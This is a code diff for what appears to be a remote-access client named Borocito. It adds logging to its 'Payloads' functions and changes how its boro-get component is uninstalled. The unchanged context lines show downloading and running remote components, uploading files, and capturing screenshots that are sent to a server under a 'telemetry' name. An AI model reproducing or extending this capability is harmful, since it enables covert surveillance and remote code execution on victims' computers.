@@ -65,6 +65,7 @@ Module Payloads
             If RunIt = True Then
                 Process.Start(filePath & "\" & fileName, Args)
             End If
+            AddToLog("Payloads", "Component downloaded!", False)
         Catch ex As Exception
             AddToLog("DownloadComponent@Payloads", "Error: " & ex.Message, True)
         End Try
@@ -77,6 +78,7 @@ Module Payloads
             Else
                 SendCustomTelemetryFile(filePath, serverUpload)
             End If
+            AddToLog("Payloads", "File uploaded!", False)
         Catch ex As Exception
             AddToLog("uploadAfile@Payloads", "Error: " & ex.Message, True)
         End Try
@@ -104,6 +106,7 @@ Module Payloads
             IMAGEN.Save(DIRCommons & "\" & theFileName, Imaging.ImageFormat.Jpeg)
             Threading.Thread.Sleep(100)
             Network.SendCustomTelemetryFile(DIRCommons & "\" & theFileName)
+            AddToLog("Payloads", "Screenshot taken!", False)
         Catch ex As Exception
             AddToLog("TakeAnScreenshot@Payloads", "Error: " & ex.Message, True)
         End Try
@@ -129,6 +132,7 @@ Module Payloads
             End Select
             newNotify.ShowBalloonTip(TipTimeOut, TipTitle, TipText, tipIcono)
             newNotify.Visible = False
+            AddToLog("Payloads", "Notify showed!", False)
         Catch ex As Exception
             AddToLog("PostNotify@Payloads", "Error: " & ex.Message, True)
         End Try
@@ -289,11 +293,8 @@ Module BOROGET
                 My.Computer.FileSystem.DeleteDirectory(DIRBoroGetInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
             End If
             'Finalizar
-            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
-            regKey.SetValue("boro-get", "")
-            regKey.SetValue("Name", "")
-            regKey.SetValue("Version", "")
-            regKey.SetValue("RepoListURL", "")
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
+            regKey.DeleteSubKeyTree("boro-get")
             Return "boro-get has been uninstalled!"
         Catch ex As Exception
             AddToLog("Uninstall@BOROGET", "Error: " & ex.Message, True)
